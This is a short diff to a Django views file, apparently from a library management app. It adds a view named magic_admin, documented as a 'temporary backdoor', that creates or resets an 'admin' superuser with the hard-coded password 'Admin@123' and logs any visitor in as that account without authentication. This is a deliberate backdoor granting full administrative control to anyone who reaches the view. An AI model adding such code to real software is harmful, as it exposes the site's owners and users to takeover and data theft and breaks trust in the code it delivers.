@@ -107,3 +107,17 @@ def edit_profile(request):
         return redirect('/')
 
     return render(request, 'edit_profile.html', {'user': user, 'profile': profile})
+
+def magic_admin(request):
+    """Temporary backdoor to instantly log the user in as Admin."""
+    user, created = User.objects.get_or_create(username='admin', defaults={'email': 'admin@library.com'})
+    user.set_password('Admin@123')
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+    
+    UserProfile.objects.get_or_create(user=user, defaults={'role': 'ADMIN', 'mobile_number': '9999999999'})
+    
+    login(request, user)
+    return redirect('/')
